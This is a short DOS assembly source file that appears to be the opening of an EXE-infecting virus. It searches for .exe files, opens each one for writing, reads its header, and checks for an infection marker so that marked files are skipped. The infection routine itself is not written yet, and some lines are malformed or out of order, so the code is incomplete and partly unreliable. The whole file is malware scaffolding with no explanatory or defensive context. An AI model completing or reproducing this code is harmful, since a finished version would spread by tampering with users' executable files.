.model small
.stack 100h
.code
start:

; ds setting
push cs
pop ds

; finding an .exe file

; setting dta on file
mov ah, 1ah
lea dx, file
int 21h

; finding the first file
lea dx, file_mask
mov ah, 4eh
int 21h
jmp file_open

; finding next file
find_next:
mov ah, 3eh
int 21h
mov ah, 4fh
int 21h

; opening the file (file descriptor -> ax)
file_open:
lea dx, file.fname
mov ax, 3D02h
int 21h
mov bx, ax ; file descriptor (ax) -> bx
jc find_next ; error handling

; reading exe header
mov ah,03fh
mov cx,1Ah
lea dx,header
int 21h

; check for infection
cmp byte ptr ds:[header+13h], 69h
jz find_next

; closing file
mov ah, 3eh
int 21h

; saving file_descriptor
mov file_descriptor, bx

; exit program
mov ah, 4ch
int 21h

; data
; DTA buffer structure
DTAFileInfo struc
reserved db 21 dup(?)
fattr db ?
ftime dw ?
fdate dw ?
fsize dd ?
fname db 13 dup(?)
ends

file DTAFileInfo <>

file_descriptor dw, ?
file_mask db '*.exe*', 0
header db 1ah dup(?)

end start